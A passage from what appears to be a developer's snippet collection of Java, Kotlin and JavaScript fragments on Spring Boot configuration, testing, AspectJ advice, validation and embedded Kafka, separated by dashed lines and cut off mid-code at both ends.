        data: {grant_type: 'password', username: userLogin, password: userPassword},
        success: function (data) {
            oauthToken = data.access_token;
            $('#loggedInStatus').show();
            $('#loginForm').hide();
            loadRecentOrders();
        }
    })
}

function loadRecentOrders() {
    $.get({
        url: 'http://localhost:8080/app/rest/v2/entities/workshop$Order?view=_local',
        headers: {
            'Authorization': 'Bearer ' + oauthToken,
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        success: function (data) {
            $('#recentOrders').show();
            $.each(data, function (i, order) {
                $('#ordersList').append("<li>" + order.description + "</li>");
            });
        }
    });
}

@ConfigurationProperties("app.system")
public class AppSystemProperties {

	@DurationUnit(ChronoUnit.SECONDS)
	private Duration sessionTimeout = Duration.ofSeconds(30);

	private Duration readTimeout = Duration.ofMillis(1000);

	public Duration getSessionTimeout() {
		return this.sessionTimeout;
	}

	public void setSessionTimeout(Duration sessionTimeout) {
		this.sessionTimeout = sessionTimeout;
	}

	public Duration getReadTimeout() {
		return this.readTimeout;
	}

	public void setReadTimeout(Duration readTimeout) {
		this.readTimeout = readTimeout;
	}

}
@ConfigurationProperties("app.io")
public class AppIoProperties {

	@DataSizeUnit(DataUnit.MEGABYTES)
	private DataSize bufferSize = DataSize.ofMegabytes(2);

	private DataSize sizeThreshold = DataSize.ofBytes(512);

	public DataSize getBufferSize() {
		return this.bufferSize;
	}

	public void setBufferSize(DataSize bufferSize) {
		this.bufferSize = bufferSize;
	}

	public DataSize getSizeThreshold() {
		return this.sizeThreshold;
	}

	public void setSizeThreshold(DataSize sizeThreshold) {
		this.sizeThreshold = sizeThreshold;
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class) 
@WebMvcTest
@AutoConfigureMockMvc
public class UserControllerIntegrationTest {
 
    @MockBean
    private UserRepository userRepository;
     
    @Autowired
    UserController userController;
 
    @Autowired
    private MockMvc mockMvc;
 
    //...
     
}

@Test
public void whenPostRequestToUsersAndValidUser_thenCorrectResponse() throws Exception {
    MediaType textPlainUtf8 = new MediaType(MediaType.TEXT_PLAIN, Charset.forName("UTF-8"));
    String user = "{\"name\": \"bob\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.content()
        .contentType(textPlainUtf8));
}
--------------------------------------------------------------------------------------------------------
String user = URLEncoder.encode(mailUserEmail, ConstantUtil.CHARACTER_ENCODING);
--------------------------------------------------------------------------------------------------------
function createUUID() {
    return uuid.v4();
}

// version 4
// createUUID.regex = '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[89abAB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$';
createUUID.regex = '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$';

createUUID.is = function (str) {
    return new RegExp(createUUID.regex).test(str);
};

const uuidV4Regex = /^[A-F\d]{8}-[A-F\d]{4}-4[A-F\d]{3}-[89AB][A-F\d]{3}-[A-F\d]{12}$/i;
// compared to:     /^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4{1}[a-fA-F0-9]{3}-[89abAB]{1}[a-fA-F0-9]{3}-[a-fA-F0-9]{12}$/

const isValidV4UUID = uuid => uuidV4Regex.test(uuid);
--------------------------------------------------------------------------------------------------------
IOUtils.toString(Thread.currentThread().getContextClassLoader().getResourceAsStream("rsb-configuration-default.json"))
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.CoreMatchers.is; 
import static org.hamcrest.CoreMatchers.nullValue; 
import static org.junit.Assert.assertThat; 
import static org.mockito.Mockito.mock; 
import static org.mockito.Mockito.when; 
 
import java.io.File; 
import java.net.URI; 
import java.net.URISyntaxException; 
import java.util.Arrays; 
import java.util.Calendar; 
import java.util.Collections; 
import java.util.GregorianCalendar; 
import java.util.TimeZone; 
 
import javax.ws.rs.core.HttpHeaders; 
import javax.xml.datatype.XMLGregorianCalendar; 
 
import org.junit.Test; 
 
/**
 * @author "OpenAnalytics <rsb.development@openanalytics.eu>" 
 */ 
public class UtilTestCase 
{ 
    @Test 
    public void isValidApplicationName() 
    { 
        assertThat(Util.isValidApplicationName("test123"), is(true)); 
        assertThat(Util.isValidApplicationName("123ABC"), is(true)); 
        assertThat(Util.isValidApplicationName("123_ABC"), is(true)); 
        assertThat(Util.isValidApplicationName("123-ABC"), is(false)); 
        assertThat(Util.isValidApplicationName(null), is(false)); 
        assertThat(Util.isValidApplicationName(""), is(false)); 
        assertThat(Util.isValidApplicationName("-test"), is(false)); 
        assertThat(Util.isValidApplicationName("1 2 3"), is(false)); 
    } 
 
    @SuppressWarnings("unchecked") 
    @Test 
    public void getSingleHeader() 
    { 
        final HttpHeaders httpHeaders = mock(HttpHeaders.class); 
        assertThat(Util.getSingleHeader(httpHeaders, "missing"), is(nullValue())); 
 
        when(httpHeaders.getRequestHeader("missing_too")).thenReturn(Collections.EMPTY_LIST); 
        assertThat(Util.getSingleHeader(httpHeaders, "missing_too"), is(nullValue())); 
 
        when(httpHeaders.getRequestHeader("single_value")).thenReturn(Collections.singletonList("bingo")); 
        assertThat(Util.getSingleHeader(httpHeaders, "single_value"), is("bingo")); 
 
        when(httpHeaders.getRequestHeader("multi_value")).thenReturn(Arrays.asList("bingo_too", "ignored")); 
        assertThat(Util.getSingleHeader(httpHeaders, "multi_value"), is("bingo_too")); 
    } 
 
    @Test 
    public void getMimeType() 
    { 
        assertThat(Util.getMimeType(new File("test.zip")).toString(), is(Constants.ZIP_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.err.txt")).toString(), 
            is(Constants.TEXT_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.pdf")).toString(), is(Constants.PDF_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.foo")).toString(), is("application/octet-stream")); 
    } 
 
    @Test 
    public void getResourceType() 
    { 
        assertThat(Util.getResourceType(Constants.ZIP_MIME_TYPE), is("zip")); 
        assertThat(Util.getResourceType(Constants.PDF_MIME_TYPE), is("pdf")); 
        assertThat(Util.getResourceType(Constants.TEXT_MIME_TYPE), is("txt")); 
        assertThat(Util.getResourceType(Constants.DEFAULT_MIME_TYPE), is("dat")); 
    } 
 
    @Test 
    public void convertToXmlDate() 
    { 
        final GregorianCalendar gmtMinus8Calendar = new GregorianCalendar( 
            TimeZone.getTimeZone(TimeZone.getAvailableIDs(-8 * 60 * 60 * 1000)[0])); 
        gmtMinus8Calendar.set(2010, Calendar.JULY, 21, 11, 35, 48); 
        gmtMinus8Calendar.set(GregorianCalendar.MILLISECOND, 456); 
 
        final XMLGregorianCalendar xmlDate = Util.convertToXmlDate(gmtMinus8Calendar); 
        assertThat(xmlDate.getTimezone(), is(0)); 
        assertThat(xmlDate.toXMLFormat(), is("2010-07-21T18:35:48.456Z")); 
    } 
 
    @Test(expected = IllegalArgumentException.class) 
    public void newURIFailure() 
    { 
        Util.newURI(" a b c "); 
    } 
 
    @Test 
    public void newURISuccess() throws URISyntaxException 
    { 
        assertThat(Util.newURI("foo://bar"), is(new URI("foo://bar"))); 
    } 
}
--------------------------------------------------------------------------------------------------------
private SearchTerm fromAndNotSeenTerm(final Flags supportedFlags, final Folder folder) {
    try {
        final FromTerm fromTerm = new FromTerm(new InternetAddress("bar@baz"));
        return new AndTerm(fromTerm, new FlagTerm(new Flags(Flags.Flag.SEEN), false));
    } catch (AddressException e) {
        throw new RuntimeException(e);
    }
}
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.startsWith;

import javax.ws.rs.NotFoundException;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

public class TestExy {
    @Rule
    public ExpectedException thrown = ExpectedException.none();

    @Test
    public void shouldThrow() {
        TestThing testThing = new TestThing();
        thrown.expect(NotFoundException.class);
        thrown.expectMessage(startsWith("some Message"));
        thrown.expect(hasProperty("response", hasProperty("status", is(404))));
        testThing.chuck();
    }

    private class TestThing {
        public void chuck() {
            Response response = Response.status(Status.NOT_FOUND).entity("Resource not found").build();
            throw new NotFoundException("some Message", response);
        }
    }
}

@Rule
public ExpectedException thrown = ExpectedException.none();

@Test
public void shouldTestExceptionMessage() throws IndexOutOfBoundsException {
    List<Object> list = new ArrayList<Object>();
 
    thrown.expect(IndexOutOfBoundsException.class);
    thrown.expectMessage("Index: 0, Size: 0");
    list.get(0); // execution will never get past this line
}
--------------------------------------------------------------------------------------------------------
@TestPropertySource(
        properties = {
                "spring.jpa.hibernate.ddl-auto=validate",
                "liquibase.enabled=false"
        }
)

@RunWith(SpringRunner.class)
@SpringBootTest
public class AddressFieldsTest {

    @InjectMocks
    AddressFieldsValidator addressFieldsValidator;

    @Autowired
    AddressFieldsConfig addressFieldsConfig;

    @Before
    public void setUp() throws Exception{
        MockitoAnnotations.initMocks(this);
        ReflectionTestUtils.setField(addressFieldsValidator,"addressFieldsConfig", addressFieldsConfig);
    }

}

@Data
@Component
@RefreshScope
@ConfigurationProperties(prefix = "address.fields.regex")
public class AddressFieldsConfig {

    private int firstName;
    private int lastName;
    .........
	
@SpringBootTest(
        properties = ["spring.profiles.active=test"],
        classes = Application.class,
)
public class MyIntTest {

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;

import de.scrum_master.app.Authenticated;

@Aspect
public class VehicleActionInterceptor {
  @Before("execution(* de.scrum_master.app.IVehicle+.*(..)) && @annotation(authenticated)")
  public void beforeAction(JoinPoint thisJoinPoint, Authenticated authenticated) {
    System.out.println(thisJoinPoint + " -> " + authenticated);
  }
}
--------------------------------------------------------------------------------------------------------
@Pointcut("call(@Authenticated * IVehicle+.*(..)) && within(RacingApp)")
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;

@Aspect
public class VehicleActionInterceptor {
  @Before("execution(@de.scrum_master.app.Authenticated * de.scrum_master.app.IVehicle+.*(..))")
  public void beforeAction(JoinPoint thisJoinPoint) {
    System.out.println(thisJoinPoint);
  }
}


--------------------------------------------------------------------------------------------------------
final Validator validator = Validation.buildDefaultValidatorFactory().getValidator();
final Set<ConstraintViolation<Object>> violations = validator
    .forExecutables()
    .validateParameters(
    object,
    method,
    args
);
import javax.validation.constraints.NotNull;
interface Foo {
    void test(@NotNull(message = "foo") String value);
}

class Bar implements Foo {
    @Override
    public void test(@NotNull final String value) {
        System.out.println(value);
    }
}

import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.startsWith;

import javax.ws.rs.NotFoundException;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

public class TestExy {
    @Rule
    public ExpectedException thrown = ExpectedException.none();

    @Test
    public void shouldThrow() {
        TestThing testThing = new TestThing();
        thrown.expect(NotFoundException.class);
        thrown.expectMessage(startsWith("some Message"));
        thrown.expect(hasProperty("response", hasProperty("status", is(404))));
        testThing.chuck();
    }

    private class TestThing {
        public void chuck() {
            Response response = Response.status(Status.NOT_FOUND).entity("Resource not found").build();
            throw new NotFoundException("some Message", response);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
    public TomcatServletWebServerFactory containerFactory() {
        return new TomcatServletWebServerFactory() {
            protected void customizeConnector(Connector connector) {
                int maxSize = 50000000;
                super.customizeConnector(connector);
                connector.setMaxPostSize(maxSize);
                connector.setMaxSavePostSize(maxSize);
                if (connector.getProtocolHandler() instanceof AbstractHttp11Protocol) {

                    ((AbstractHttp11Protocol <?>) connector.getProtocolHandler()).setMaxSwallowSize(maxSize);
                    logger.info("Set MaxSwallowSize "+ maxSize);
                }
            }
        };

    }
--------------------------------------------------------------------------------------------------------
@After("execution(* org.springsource.service.OrderServiceImpl.findOrder(..))") 


DefaultHandlerExceptionResolver
SimpleMappingExceptionResolver
ExceptionHandlerExceptionResolver
AbstractHandlerMethodExceptionResolver
ResponseStatusExceptionResolver

AbstractHandlerMethodExceptionResolver
--------------------------------------------------------------------------------------------------------
@Pointcut("execution(* io.mc.springaspects.DummyComponent.doThrow())")
protected void doThrow() { }

@AfterThrowing(pointcut="doThrow()", throwing="ex")
public void doThrowThrows(TestException ex) {
   consoleLogger.log("doThrow() THROWS EXCEPTION: %s",
        ex.getClass().getSimpleName());
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

import java.util.Arrays;

@Slf4j
@Aspect
@Component
public class MyAspect {

//    //    @Pointcut("@target(org.springframework.web.bind.annotation.RestControllerAdvice)")
////    @Pointcut("@target(org.springframework.stereotype.Repository)")
////    @Pointcut("@target(com.paragon.microservices.links.aspect.ExceptionLogHandler)")
//    @Pointcut("within(@org.springframework.web.bind.annotation.RestControllerAdvice *)")
//    public void repositoryClassMethods() {
//    }

    @Pointcut("@annotation(org.springframework.web.bind.annotation.RestControllerAdvice)")
    public void restControllerAdviceAnnotation() {
    }

    @Pointcut("@annotation(com.paragon.microservices.links.aspect.ExceptionLogHandler)")
    public void exceptionLogHandlerAnnotation() {
    }

    @Pointcut("@annotation(org.springframework.web.bind.annotation.ExceptionHandler)")
    public void exceptionHandlerAnnotation() {
    }

//    @Pointcut("execution(@com.paragon.microservices.links.aspect.ExceptionLogHandler * *.*(..))")
//    protected void useAdviceOnThisMethodAnnotation() {
//    }

    @Pointcut("execution(* org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.*(..))")
    protected void abstractHandlerMethodExceptionResolver() {
    }

    @Pointcut("execution(* org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler.*(..))")
    protected void responseEntityExceptionHandler() {
    }

    @Pointcut("exceptionHandlerAnnotation() && @annotation(exceptionLogHandler)")
    protected void before333(final ExceptionLogHandler exceptionLogHandler) {
    }

//    @Before("before3()")
//    public void before(final JoinPoint joinPoint) {
//        log.info(" Check for user access ");
//        log.info(" Allowed execution for {}", joinPoint);
//    }

//    @Around("repositoryClassMethods()")
//    public Object measureMethodExecutionTime(ProceedingJoinPoint pjp) throws Throwable {
//        long start = System.nanoTime();
//        Object retval = pjp.proceed();
//        long end = System.nanoTime();
//        String methodName = pjp.getSignature().getName();
//        return retval;
//    }

//    @Before("useAdviceOnThisMethodAnnotation()")
//    public void useAdviceBefore(final JoinPoint joinPoint) {
//        log.info("[ASPECT] SOURCE LOCATION: %s", joinPoint.getSourceLocation());
//    }

//    @Before("useAdviceOnThisMethodAnnotation() && @annotation(useAdvice)")
//    public void useAdviceBefore2(final JoinPoint joinPoint, final ExceptionLogHandler useAdvice) {
//        log.info("VALUE: %s", useAdvice);
//    }

//    @Before("callAtMyServicePublic3()")
//    public void beforeCallAtMethod3(final JoinPoint jp) {
//        final String args = Arrays.stream(jp.getArgs())
//                .map(a -> a.toString())
//                .collect(Collectors.joining(","));
//        log.info("before " + jp.toString() + ", args=[" + args + "]");
//    }
//
//    @Before("callAtMyServicePublic5()")
//    public void beforeCallAtMethod5(final JoinPoint jp) {
//        final String args = Arrays.stream(jp.getArgs())
//                .map(a -> a.toString())
//                .collect(Collectors.joining(","));
//        log.info("before " + jp.toString() + ", args=[" + args + "]");
//    }

    @Around("restControllerAdviceAnnotation()")
    public Object aroundCall3(final ProceedingJoinPoint joinPoint) throws Throwable {
        log.debug("logAround() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
        log.debug("logAround before is running!");
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }

    @Around("exceptionLogHandlerAnnotation() || exceptionHandlerAnnotation() || responseEntityExceptionHandler()")
    public Object aroundCall(final ProceedingJoinPoint joinPoint) throws Throwable {
        log.debug("logAround() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
        log.debug("logAround before is running!");
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }

    @Around("before333(exceptionLogHandler)")
    public Object ar(final ProceedingJoinPoint joinPoint, final ExceptionLogHandler exceptionLogHandler) throws Throwable {
        final String value = exceptionLogHandler.value();
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }

//    @Around("callAtMyServicePublic5()")
//    public Object aroundCall2(final ProceedingJoinPoint joinPoint) throws Throwable {
//        log.debug("logAround() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
//        log.debug("logAround before is running!");
//        final Object result = joinPoint.proceed();
//        log.debug("logAround after is running!");
//        return result;
//    }
}
--------------------------------------------------------------------------------------------------------
{
"timestamp": "2019-08-20T14:28:03.406+0000",
"status": 405,
"error": "Method Not Allowed",
"message": "Request method 'GET' not supported",
"path": "/api/v0/links/execute/23233"
}
--------------------------------------------------------------------------------------------------------
@Before("doStuff()")
public void beforeDoStuff(JoinPoint joinPoint) {
     consoleLogger.log("BEFORE CALL TO doStuff()");
     
     consoleLogger.log("ARGUMENTS:");
     Arrays.stream(joinPoint.getArgs())
         .map(Object::toString)
         .forEach(arg -> consoleLogger.log("\t%s", arg));
     
     consoleLogger.log("");
}

@Pointcut("execution(@io.mc.springaspects.UseAdviceOnThisMethod * *.*(..))")
protected void useAdviceOnThisMethodAnnotation() { }    

@Before("useAdviceOnThisMethodAnnotation()")
public void useAdviceBefore(JoinPoint joinPoint) {
  consoleLogger.log("[ASPECT] SOURCE LOCATION: %s",
      joinPoint.getSourceLocation());
}
@UseAdviceOnThisMethod
public void someMethod() {
   consoleLogger.log("Hello, world!");
}

@Pointcut("execution(@io.mc.springaspects.UseAdviceOnThisMethod * *.*(..))")
protected void useAdviceOnThisMethodAnnotation() { }    

@Before("useAdviceOnThisMethodAnnotation() && @annotation(useAdvice)")
public void useAdviceBefore(JoinPoint joinPoint, 
                            UseAdviceOnThisMethod useAdvice) {
  consoleLogger.log("VALUE: %s", useAdvice.value());
}
--------------------------------------------------------------------------------------------------------
package com.spring.mvc.demo.exception.advice;
 
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.servlet.ModelAndView;
 
import com.spring.mvc.demo.exception.MyException;
 
@ControllerAdvice
public class ExceptionControllerAdvice {
 
    @ExceptionHandler(MyException.class)
    public ModelAndView handleMyException(MyException mex) {
 
        ModelAndView model = new ModelAndView();
        model.addObject("errCode", mex.getErrCode());
        model.addObject("errMsg", mex.getErrMsg());
        model.setViewName("error/generic_error");
        return model;
    }
 
    @ExceptionHandler(Exception.class)
    public ModelAndView handleException(Exception ex) {
 
        ModelAndView model = new ModelAndView();
        model.addObject("errMsg", "This is a 'Exception.class' message.");
        model.setViewName("error/generic_error");
        return model;
 
    }
}

package com.jcombat.controller;
  
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;
  
import com.jcombat.bean.ErrorResponse;
  
@ControllerAdvice
public class ExceptionControllerAdvice {
  
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> exceptionHandler(Exception ex) {
        ErrorResponse error = new ErrorResponse();
        error.setErrorCode(HttpStatus.INTERNAL_SERVER_ERROR.value());
        error.setMessage("Please contact your administrator");
        return new ResponseEntity<ErrorResponse>(error, HttpStatus.OK);
    }
}
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping("/myworld")
public class MyWorldController {
	@Autowired
	private UserValidator userValidator;
	@RequestMapping(value="signup", method = RequestMethod.GET)
	public ModelAndView user(){
		return new ModelAndView("user","user",new User());
	}
	@InitBinder
	public void dataBinding(WebDataBinder binder) {
		binder.addValidators(userValidator);
	}
	@RequestMapping(value="save", method = RequestMethod.POST)
	public String createUser(@ModelAttribute("user") @Valid User user,BindingResult result, ModelMap model) 
			                                                throws FileNotFoundException {
	    if(result.hasErrors()) {
	    	return "user";
	    }
	    if(user.getName().equals("exception")) {
	        throw new FileNotFoundException("Error found.");	
	    }
	    System.out.println("Name:"+ user.getName());
	    System.out.println("Date of Birth:"+ user.getDob());
	    return "success";
	}	
} 
--------------------------------------------------------------------------------------------------------
ValidationMessages_en_US.properties
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@ComponentScan(basePackages = { "com.myname" },
              excludeFilters = @ComponentScan.Filter(type = FilterType.ASPECTJ, pattern = "com.myname.configs.*"))
public class DemoWebappApplication {...}  
--------------------------------------------------------------------------------------------------------
@Configuration
@PropertiesValueSource("classpath:com/acme/db.properties")
public class AppConfig {
    @ExternalValue("datasource.username") String username;

    @Bean
    public TestBean testBean() {
        return new TestBean(username);
    }
}

@Configuration
@EnvironmentValueSource
@SystemPropertiesValueSource
@PropertiesValueSource("classpath:com/acme/db.properties")
public class AppConfig {
    @ExternalValue("datasource.username") String username;

    @Bean
    public TestBean testBean() {
        return new TestBean(username);
    }
}
--------------------------------------------------------------------------------------------------------
    private val server: KafkaServer
    private val zkClient: ZkClient
    private val zkServer: EmbeddedZookeeper

    init {
        zkServer = EmbeddedZookeeper()
        val zkConnect = "127.0.0.1:${zkServer.port()}"

        val props = Properties()
        props.setProperty("zookeeper.connect", zkConnect)
        props.setProperty("broker.id", "0")
        props.setProperty("log.dirs", Files.createTempDirectory("kafka-").toAbsolutePath().toString())
        props.setProperty("listeners", "PLAINTEXT://127.0.0.1:$port")
        props.setProperty("offsets.topic.replication.factor", "1")

        server = KafkaServer(KafkaConfig(props), Time.SYSTEM, Option.apply("kafka-broker"), JavaConversions.asScalaBuffer(emptyList()))
        server.startup()

        zkClient = ZkClient(zkConnect, 30000, 30000, `ZKStringSerializer$`.`MODULE$`)
        val zkUtils = ZkUtils.apply(zkClient, false)
        AdminUtils.createTopic(zkUtils, topic, 1, 1, Properties(), RackAwareMode.`Disabled$`.`MODULE$`)

        TestUtils.waitUntilMetadataIsPropagated(scala.collection.JavaConversions.asScalaBuffer(listOf(server)), topic, 0, 5000);

    }

    override fun close() {
        server.shutdown()
        server.awaitShutdown()
        zkClient.close()
        zkServer.shutdown()
    }
}
--------------------------------------------------------------------------------------------------------
language: java
jdk:
  - oraclejdk8
sudo: false
cache:
  directories:
    - $HOME/.m2
install: true

## Define kafka versions to build against
env:
-
  KAFKA_VERSION=0.11.0.3
  EXCLUDE_KAFKA_TESTS=1_0_x
-
  KAFKA_VERSION=1.0.2
  EXCLUDE_KAFKA_TESTS=NOT-USED
-
  KAFKA_VERSION=1.1.1
  EXCLUDE_KAFKA_TESTS=NOT-USED
-
  KAFKA_VERSION=2.0.1
  EXCLUDE_KAFKA_TESTS=0_11_0_x
script:
  ## Generate dummy SSL Certificates used in tests
  - script/generateCertificatesForTests.sh
  ## Run CheckStyle and License Header checks, compile, and install locally
  - mvn clean install -DskipTests=true -DskipCheckStyle=false -Dmaven.javadoc.skip=true -B -V -DkafkaVersion=$KAFKA_VERSION -Dtests.excluded=$EXCLUDE_KAFKA_TESTS
  ## Run test suite
  - mvn test -B -DkafkaVersion=$KAFKA_VERSION -Dtests.excluded=$EXCLUDE_KAFKA_TESTS -DskipCheckStyle=true -Djava.security.auth.login.config=${PWD}/kafka-junit-core/src/test/resources/jaas.conf
--------------------------------------------------------------------------------------------------------
FROM confluentinc/cp-kafka

VOLUME ["/var/lib/${COMPONENT}/data", "/etc/${COMPONENT}/secrets"]

COPY include/etc/confluent/docker /etc/confluent/docker

CMD ["/etc/confluent/docker/run"]

ENTRYPOINT ["/docker_entrypoint.sh"]


docker-compose -f kafka-single-node.yml up -d

docker exec -it compose_kafka_1 bash

kafka-topics --zookeeper zookeeper:2181 --list

kafka-console-consumer --bootstrap-server kafka:29092 --topic demo-topic-1 --from-beginning

docker-compose -f kafka-single-node.yml down
--------------------------------------------------------------------------------------------------------
@BeforeClass
public static void setUpBeforeClass() {
    System.setProperty("spring.kafka.bootstrap-servers", embeddedKafka.getBrokersAsString());
    System.setProperty("spring.cloud.stream.kafka.binder.zkNodes", embeddedKafka.getZookeeperConnectionString());
}
--------------------------------------------------------------------------------------------------------
spring:
  kafka:
    producer:
      value-serializer: org.springframework.kafka.support.serializer.JsonSerializer
--------------------------------------------------------------------------------------------------------
        <!-- TestContainers library dependency -->
        <dependency>
            <groupId>org.testcontainers</groupId>
            <artifactId>testcontainers</artifactId>
            <version>${testcontainers.version}</version>
        </dependency>
        <dependency>
            <groupId>org.testcontainers</groupId>
            <artifactId>postgresql</artifactId>
            <version>${testcontainers.version}</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.testcontainers</groupId>
            <artifactId>kafka</artifactId>
            <version>${testcontainers.version}</version>
            <scope>test</scope>
        </dependency>

--------------------------------------------------------------------------------------------------------
javac src/main/java/org/hibernate/validator/ap/demo/Car.java \
   -cp /path/to/validation-api-1.0.0.GA.jar \ 
   -processorpath /path/to/validation-api-1.0.0.GA.jar:/path/to/hibernate-validator-annotation-processor-4.1.0.Final.jar    
   
<javac srcdir="src/main"
       destdir="build/classes"
       classpath="/path/to/validation-api-1.0.0.GA.jar">
       <compilerarg value="-processorpath" />
       <compilerarg value="/path/to/validation-api-1.0.0.GA.jar:/path/to/hibernate-validator-annotation-processor-4.1.0.Final.jar"/>
</javac>

<dependency>
    <groupId>org.hibernate</groupId>
    <artifactId>hibernate-validator-annotation-processor</artifactId>
    <version>4.1.0.Final</version>
    <scope>compile</scope>
</dependency>

<pluginRepositories>
    <pluginRepository>
        <id>maven-annotation-plugin-repo</id>
        <url>http://maven-annotation-plugin.googlecode.com/svn/trunk/mavenrepo</url>
    </pluginRepository>
</pluginRepositories>

validation-api-1.0.0.GA.jar

hibernate-validator-annotation-processor-4.1.0.Final.jar
--------------------------------------------------------------------------------------------------------
import javax.validation.Validator;

import com.couchbase.client.java.Bucket;

import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnSingleCandidate;
import org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration;
import org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.data.couchbase.core.mapping.event.ValidatingCouchbaseEventListener;
import org.springframework.data.couchbase.repository.CouchbaseRepository;

/**
 * {@link EnableAutoConfiguration Auto-configuration} for Spring Data's Couchbase support.
 *
 * @author Eddú Meléndez
 * @author Stephane Nicoll
 * @since 1.4.0
 */
@Configuration
@ConditionalOnClass({ Bucket.class, CouchbaseRepository.class })
@AutoConfigureAfter({ CouchbaseAutoConfiguration.class,
		ValidationAutoConfiguration.class })
@EnableConfigurationProperties(CouchbaseDataProperties.class)
@Import({ CouchbaseConfigurerAdapterConfiguration.class,
		SpringBootCouchbaseDataConfiguration.class })
public class CouchbaseDataAutoConfiguration {

	@Configuration
	@ConditionalOnClass(Validator.class)
	public static class ValidationConfiguration {

		@Bean
		@ConditionalOnSingleCandidate(Validator.class)
		public ValidatingCouchbaseEventListener validationEventListener(final Validator validator) {
			return new ValidatingCouchbaseEventListener(validator);
		}

	}
}

import javax.validation.constraints.NotNull;

public class Car {

    @NotNull
    private String manufacturer;

    @AssertTrue
    private boolean isRegistered;

    public Car(String manufacturer, boolean isRegistered) {
        super();
        this.manufacturer = manufacturer;
        this.isRegistered = isRegistered;
    }
}

ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
Validator validator = factory.getValidator();

Car car = new Car(null);

Set<ConstraintViolation<Car>> constraintViolations = validator.validate(car);

assertEquals(1, constraintViolations.size());
assertEquals("may not be null", constraintViolations.iterator().next().getMessage());


Validator validator = Validation.buildDefaultValidatorFactory().getValidator();

Car car = new Car(null);

Set<ConstraintViolation<Car>> constraintViolations = validator.validateProperty(car, "manufacturer");

assertEquals(1, constraintViolations.size());
assertEquals("may not be null", constraintViolations.iterator().next().getMessage());

Validator validator = Validation.buildDefaultValidatorFactory().getValidator();


Set<ConstraintViolation<Car>> constraintViolations = validator.validateValue(Car.class, "manufacturer", null);

assertEquals(1, constraintViolations.size());
assertEquals("may not be null", constraintViolations.iterator().next().getMessage());
--------------------------------------------------------------------------------------------------------
@Order(Ordered.HIGHEST_PRECEDENCE)
--------------------------------------------------------------------------------------------------------
    public static class StepConverters {

        public static class RequestSourceConverter {
            @AsParameterConverter
            public RequestSourceType convertToRequestType(final String value) {
                return RequestSourceType.findBySourceCode(value);
            }
        }

        public static class IssueTypeConverter {
            @AsParameterConverter
            public IssueType convertToIssueType(final String value) {
                return IssueType.findByIssueCode(value);
            }
        }
    }
--------------------------------------------------------------------------------------------------------
public StepsRunner() {
    super();
    configuration = new MostUsefulConfiguration();
    final File outputDir = new File(System.getProperty("jbehave.output.dir"));
    configuration.useStoryReporterBuilder( new StoryReporterBuilder() {
        @Override
        public File outputDirectory()
        {
